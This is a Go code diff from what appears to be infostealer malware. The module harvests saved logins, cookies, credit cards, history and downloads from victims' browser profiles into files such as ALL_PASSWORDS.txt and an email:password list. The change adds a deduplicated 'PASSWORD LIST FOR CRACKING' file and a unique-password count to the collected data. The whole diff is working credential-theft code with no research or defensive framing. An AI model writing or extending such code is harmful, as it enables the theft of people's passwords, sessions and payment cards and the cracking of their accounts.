@@ -152,6 +152,7 @@ func Run(dataCollector *collector.DataCollector) {
 	// Create master password files
 	allPasswordsFile := filepath.Join(tempDir, "ALL_PASSWORDS.txt")
 	emailPasswordFile := filepath.Join(tempDir, "EMAIL_PASSWORD_LIST.txt")
+	passwordListFile := filepath.Join(tempDir, "PASSWORD_LIST.txt")
 	
 	fileutil.AppendFile(allPasswordsFile, "🔐 ALL EXTRACTED PASSWORDS\n")
 	fileutil.AppendFile(allPasswordsFile, "===========================\n\n")
@@ -161,11 +162,15 @@ func Run(dataCollector *collector.DataCollector) {
 	fileutil.AppendFile(emailPasswordFile, "📧 EMAIL:PASSWORD COMBINATIONS\n")
 	fileutil.AppendFile(emailPasswordFile, "================================\n\n")
 
+	fileutil.AppendFile(passwordListFile, "🔑 PASSWORD LIST FOR CRACKING\n")
+	fileutil.AppendFile(passwordListFile, "===============================\n\n")
+
 	totalLogins := 0
 	totalCookies := 0
 	totalCards := 0
 	totalHistory := 0
 	totalDownloads := 0
+	passwordSet := make(map[string]bool) // To avoid duplicate passwords
 
 	for _, profile := range profiles {
 		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 && len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 && len(profile.History) == 0 {
@@ -197,6 +202,12 @@ func Run(dataCollector *collector.DataCollector) {
 					// Also add username:password combinations
 					userPassLine := fmt.Sprintf("%s:%s", login.Username, login.Password)
 					fileutil.AppendFile(emailPasswordFile, userPassLine)
+				}
+
+				// Add unique passwords to password list
+				if login.Password != "" && !passwordSet[login.Password] {
+					passwordSet[login.Password] = true
+					fileutil.AppendFile(passwordListFile, login.Password)
 				}
 				
 				totalLogins++
@@ -278,11 +289,12 @@ func Run(dataCollector *collector.DataCollector) {
 	}
 
 	// Add summary to master files
-	summary := fmt.Sprintf("\n\n📊 SUMMARY\n==========\nTotal Logins: %d\nTotal Cookies: %d\nTotal Credit Cards: %d\nTotal History: %d\nTotal Downloads: %d\nTotal Profiles: %d", 
-		totalLogins, totalCookies, totalCards, totalHistory, totalDownloads, len(profiles))
+	summary := fmt.Sprintf("\n\n📊 SUMMARY\n==========\nTotal Logins: %d\nTotal Cookies: %d\nTotal Credit Cards: %d\nTotal History: %d\nTotal Downloads: %d\nTotal Profiles: %d\nUnique Passwords: %d", 
+		totalLogins, totalCookies, totalCards, totalHistory, totalDownloads, len(profiles), len(passwordSet))
 	
 	fileutil.AppendFile(allPasswordsFile, summary)
 	fileutil.AppendFile(emailPasswordFile, fmt.Sprintf("\n\nTotal combinations: %d", totalLogins))
+	fileutil.AppendFile(passwordListFile, fmt.Sprintf("\n\nTotal unique passwords: %d", len(passwordSet)))
 
 	// Add browsers data to collector
 	browsersInfo := map[string]interface{}{
@@ -292,6 +304,7 @@ func Run(dataCollector *collector.DataCollector) {
 		"TotalHistory":     totalHistory,
 		"TotalDownloads":   totalDownloads,
 		"ProfilesFound":    len(profiles),
+		"UniquePasswords":  len(passwordSet),
 		"TreeView":         fileutil.Tree(tempDir, ""),
 	}
 	dataCollector.AddData("browsers", browsersInfo)
